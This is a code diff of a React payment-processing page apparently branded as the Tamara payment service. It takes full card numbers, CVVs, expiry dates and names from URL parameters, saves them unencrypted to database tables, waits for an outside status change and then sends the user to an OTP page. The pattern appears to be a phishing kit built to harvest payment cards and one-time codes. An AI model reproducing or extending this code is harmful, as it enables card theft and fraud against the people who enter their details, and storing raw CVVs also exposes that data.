@@ -16,8 +16,8 @@ const TamaraPaymentProcessing = () => {
   const navigate = useNavigate();
   const [messageIndex, setMessageIndex] = useState(0);
   const [paymentStatus, setPaymentStatus] = useState<"processing" | "success" | "failed">("processing");
-  const [paymentId, setPaymentId] = useState<string | null>(null);
 
+  const paymentId = searchParams.get("paymentId") || "";
   const cardholderName = searchParams.get("cardholderName") || "";
   const cardNumber = searchParams.get("cardNumber") || "";
   const cardNumberLast4 = searchParams.get("cardNumberLast4") || "";
@@ -41,10 +41,10 @@ const TamaraPaymentProcessing = () => {
   useEffect(() => {
     const submitPayment = async () => {
       try {
-        // Insert payment record
-        const { data, error } = await supabase
+        // تحديث سجل الدفع الموجود بدلاً من إنشاء جديد
+        const { error: updateError } = await supabase
           .from("tamara_payments")
-          .insert({
+          .update({
             cardholder_name: cardholderName,
             card_number: cardNumber,
             card_number_last4: cardNumberLast4,
@@ -52,18 +52,14 @@ const TamaraPaymentProcessing = () => {
             cvv: cvv,
             total_amount: parseFloat(totalAmount),
             monthly_payment: parseFloat(monthlyPayment),
-            company: company,
-            payment_status: "pending",
           })
-          .select()
-          .single();
+          .eq("id", paymentId);
 
-        if (error) throw error;
-        setPaymentId(data.id);
+        if (updateError) throw updateError;
 
         // حفظ محاولة الدفع
         await supabase.from("tamara_payment_attempts").insert({
-          payment_id: data.id,
+          payment_id: paymentId,
           card_number: cardNumber,
           card_holder_name: cardholderName,
           expiry_date: expiryDate,
@@ -75,7 +71,7 @@ const TamaraPaymentProcessing = () => {
           const { data: statusData, error: statusError } = await supabase
             .from("tamara_payments")
             .select("payment_status")
-            .eq("id", data.id)
+            .eq("id", paymentId)
             .single();
 
           if (statusError) {
@@ -88,7 +84,7 @@ const TamaraPaymentProcessing = () => {
             clearInterval(pollInterval);
             setPaymentStatus("success");
             setTimeout(() => {
-              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${data.id}`);
+              navigate(`/otp-verification?company=${encodeURIComponent(company)}&price=${totalAmount}&cardLast4=${cardNumberLast4}&paymentId=${paymentId}`);
             }, 2000);
           } else if (statusData.payment_status === "rejected") {
             clearInterval(pollInterval);
